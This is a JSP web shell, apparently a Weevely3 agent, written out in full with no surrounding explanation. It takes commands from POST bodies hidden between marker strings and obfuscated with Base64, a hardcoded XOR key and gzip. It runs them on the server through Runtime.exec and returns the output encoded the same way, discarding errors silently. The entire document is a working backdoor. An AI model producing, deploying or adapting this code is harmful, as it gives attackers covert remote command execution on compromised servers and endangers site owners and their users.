b'\n\n<%@ page import="java.util.*,java.io.*,java.util.zip.*" %>\n<%\n    // Weevely3 JSP Agent\n    // Implements XOR -> GZIP -> Base64 protocol\n\n    String k = "5f4dcc3b";\n    String kh = "5aa765d61d83";\n    String kf = "27deb882cf99";\n    String p = "gtfTTRuwIe7puLq7";\n\n    if (request.getMethod().equals("POST")) {\n        try {\n            // Read raw body\n            StringBuilder sb = new StringBuilder();\n            BufferedReader reader = request.getReader();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                sb.append(line);\n            }\n            String content = sb.toString();\n\n            int start = content.indexOf(kh);\n            int end = content.indexOf(kf);\n\n            if (start != -1 && end != -1) {\n                String payload = content.substring(start + kh.length(), end);\n\n                // Decode: Base64 -> XOR -> Gunzip\n                byte[] decodedBytes = java.util.Base64.getDecoder().decode(payload);\n                String xorred = new String(decodedBytes, "ISO-8859-1");\n                \n                StringBuilder unxorred = new StringBuilder();\n                for (int i = 0; i < xorred.length(); i++) {\n                    unxorred.append((char)(xorred.charAt(i) ^ k.charAt(i % k.length())));\n                }\n\n                ByteArrayInputStream bais = new ByteArrayInputStream(unxorred.toString().getBytes("ISO-8859-1"));\n                GZIPInputStream gzis = new GZIPInputStream(bais);\n                InputStreamReader isr = new InputStreamReader(gzis, "ISO-8859-1");\n                BufferedReader br = new BufferedReader(isr);\n                \n                StringBuilder cmdSb = new StringBuilder();\n                while ((line = br.readLine()) != null) {\n                    cmdSb.append(line);\n                }\n                String cmd = cmdSb.toString();\n\n                // Execute Command\n                Process proc = Runtime.getRuntime().exec(cmd);\n                InputStream stdin = proc.getInputStream();\n                InputStream stderr = proc.getErrorStream();\n                \n                Scanner s = new Scanner(stdin).useDelimiter("\\\\A");\n                String output = s.hasNext() ? s.next() : "";\n                s = new Scanner(stderr).useDelimiter("\\\\A");\n                output += s.hasNext() ? s.next() : "";\n\n                // Encode: Gzip -> XOR -> Base64\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                GZIPOutputStream gzos = new GZIPOutputStream(baos);\n                gzos.write(output.getBytes("ISO-8859-1"));\n                gzos.close();\n                \n                String compressed = baos.toString("ISO-8859-1");\n                StringBuilder reXorred = new StringBuilder();\n                for (int i = 0; i < compressed.length(); i++) {\n                    reXorred.append((char)(compressed.charAt(i) ^ k.charAt(i % k.length())));\n                }\n                \n                String encoded = java.util.Base64.getEncoder().encodeToString(reXorred.toString().getBytes("ISO-8859-1"));\n\n                out.print(p + kh + encoded + kf);\n            }\n        } catch (Exception e) {\n            // out.print(e.toString());\n        }\n    }\n%>\n'
